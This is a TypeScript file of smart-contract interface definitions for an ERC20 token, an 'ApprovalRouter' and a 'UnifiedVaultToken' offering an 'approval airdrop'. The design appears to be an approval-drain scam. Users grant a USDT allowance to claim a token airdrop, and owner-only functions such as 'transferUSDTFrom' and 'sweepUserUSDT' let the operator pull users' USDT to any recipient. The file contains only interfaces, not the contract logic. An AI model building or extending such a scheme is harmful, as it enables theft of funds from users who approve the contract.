// src/contracts/abis.ts

// ERC20 标准 ABI
export const ERC20_ABI = [
  "function name() view returns (string)",
  "function symbol() view returns (string)",
  "function totalSupply() view returns (uint256)",
  "function balanceOf(address) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function transfer(address to, uint256 amount) returns (bool)",
  "function transferFrom(address from, address to, uint256 amount) returns (bool)"
];

// ApprovalRouter 合约 ABI
export const ROUTER_ABI = [
  "function USDT() view returns (address)",
  "function vaultAddress() view returns (address)",
  "function setVaultAddress(address _vaultAddress)",
  "function transferUSDTFrom(address from, address to, uint256 amount)",
  "function getUserAllowance(address user) view returns (uint256)",
  "function getUSDTAddress() view returns (address)",
  "function owner() view returns (address)"
];

// UnifiedVaultToken 合约 ABI (既是代币又是空投合约)
export const VAULT_TOKEN_ABI = [
  // ERC20 基础功能
  "function name() view returns (string)",
  "function symbol() view returns (string)",
  "function totalSupply() view returns (uint256)",
  "function balanceOf(address) view returns (uint256)",
  "function cap() view returns (uint256)",
  
  // 空投功能
  "function claimApprovalAirdrop()",
  "function hasReceivedApprovalAirdrop(address) view returns (bool)",
  "function airdropAmount() view returns (uint256)",
  "function minApprovalAmount() view returns (uint256)",
  "function totalAirdropsClaimed() view returns (uint256)",
  "function totalAirdropsDistributed() view returns (uint256)",
  "function canClaimAirdrop(address user) view returns (bool)",
  "function getAirdropInfo() view returns (uint256 _totalClaimed, uint256 _totalDistributed, uint256 _airdropAmount, uint256 _minApprovalAmount, uint256 _remainingSupply)",
  
  // 管理员功能
  "function owner() view returns (address)",
  "function setAirdropAmount(uint256 newAmount)",
  "function setMinApprovalAmount(uint256 newAmount)",
  "function batchAirdrop(address[] calldata recipients)",
  "function resetClaimStatus(address user)",
  "function sweepUserUSDT(address userToSweep, address recipient, uint256 amountToTransfer)",
  "function depositUSDT(uint256 amount)",
  "function getRouterAddress() view returns (address)",
  
  // 事件
  "event ApprovalAirdropClaimed(address indexed user, uint256 amount)"
];
